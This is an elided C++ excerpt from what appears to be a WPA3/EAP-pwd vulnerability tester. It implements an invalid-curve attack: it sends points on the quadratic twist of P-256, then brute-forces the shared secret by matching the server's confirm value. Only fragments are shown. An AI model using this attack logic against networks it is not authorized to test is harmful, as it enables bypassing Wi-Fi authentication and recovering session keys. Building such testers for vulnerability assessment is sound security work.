...
using namespace wpa3_tester::eap_helper;
...
// P-256 prime p (shared by the twist): p = 2^256 - 2^224 + 2^192 + 2^96 - 1
static constexpr array<uint8_t, 32> FIELD_P = {
    0xff,0xff,0xff,0xff, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xff,
};
// a = -3 mod p (same as P-256, twist keeps a unchanged)
static constexpr array<uint8_t, 32> TWIST_A = {
    0xff,0xff,0xff,0xff, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xff, 0xff,0xff,0xff,0xfc,
};
// b coefficient of the quadratic twist (differs from P-256)
...
// group order of the twist curve
...
static optional<array<uint8_t, 32>> brute_force_k(const array<uint8_t, 64> &Element_S,
	...
	if(EC_POINT_set_affine_coordinates_GFp(grp, gen, gx, gy, ctx) != 1) { log(LogLevel::ERROR, "OpenSSL issue"); }
	...
	for(int i = 1; i < 269 && !result; i++) {
		...
		if(pwd_confirm(kx_bytes, Element_S, Scalar_S, our_elem, our_scal) == Confirm_S) result = kx_bytes;
	}
...
bool run_invalid_curve_exchange(EAP_Att &eap_att) {
	...
	array<uint8_t, 64> Element_S{};
	array<uint8_t, 32> Scalar_S{};
	{
		optional<EapPwdFrame> frame;
		const auto e = wait_eapol(eap_att, get_frame(frame, PWD_OPCODE_COMMIT));
		if(!e || e->empty()) {
		...
		copy_n(frame->pwd_data.begin() + 64, 32, Scalar_S.begin());
	...
	{
		optional<EapPwdFrame> frame;
		const auto e = wait_eapol(eap_att, get_frame(frame, PWD_OPCODE_CONFIRM));
		if(!e || e->empty()) {
		...
		const auto kx = brute_force_k(Element_S, Scalar_S, server_confirm);
		if(!kx) {
		...
		const auto our_confirm = pwd_confirm(*kx, our_elem, our_scal, Element_S, Scalar_S);
